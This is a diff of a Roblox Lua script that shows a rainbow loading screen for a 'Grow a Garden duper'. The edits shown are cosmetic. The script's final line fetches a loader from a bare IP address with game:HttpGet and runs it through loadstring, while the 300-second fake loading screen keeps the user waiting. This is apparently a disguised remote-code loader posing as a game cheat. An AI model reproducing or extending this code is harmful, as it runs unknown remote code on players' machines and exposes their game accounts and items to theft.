@@ -91,7 +91,7 @@ local function createLoadingScreen(gameName, duration)
     --// Rainbow animation
     task.spawn(function()
         while gui.Parent do
-            local t = tick() * 0.5 -- Adjust speed of color change
+            local t = tick() * 1.0 -- Adjust speed of color change
             title.TextColor3 = getRainbowColor(t)
             bar.BackgroundColor3 = getRainbowColor(t + 2) -- Offset for bar
             percent.TextColor3 = getRainbowColor(t + 4) -- Offset for percent
@@ -115,6 +115,6 @@ local function createLoadingScreen(gameName, duration)
 end
 
 --// Execute script
-createLoadingScreen("GROW A GARDEN DUPER", 300)
+createLoadingScreen("GROW A GARDEN DUPER!", 300)
 ID="fe52a43a-7741-4117-9380-3577c232b83d";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
